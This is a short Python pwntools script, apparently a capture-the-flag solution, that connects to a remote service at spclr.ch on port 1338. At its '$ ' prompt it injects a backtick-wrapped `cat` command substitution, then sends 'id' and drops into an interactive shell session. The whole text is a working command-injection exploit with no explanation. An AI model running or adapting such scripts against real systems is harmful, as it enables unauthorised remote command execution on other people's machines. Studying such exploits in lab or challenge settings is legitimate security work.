from pwn import *

io = remote('spclr.ch', 1338)
io.recvuntil(b'$ ')
io.sendline(b'`cat`')
io.sendline(b'id')
io.shutdown()
io.interactive()
